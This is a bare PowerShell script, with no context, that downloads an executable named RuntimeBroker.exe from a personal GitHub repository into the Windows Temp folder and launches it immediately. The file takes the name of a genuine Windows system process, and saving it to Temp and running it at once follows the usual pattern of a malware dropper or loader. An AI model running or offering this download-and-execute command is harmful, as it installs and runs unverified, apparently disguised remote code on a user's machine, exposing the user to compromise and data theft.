$url = "https://github.com/Xmadter/runtime/blob/main/RuntimeBroker.exe"
$out = "$env:Temp/RuntimeBroker.exe"
Invoke-WebRequest -Uri $url -OutFile $out 
Start-Process -FilePath $out
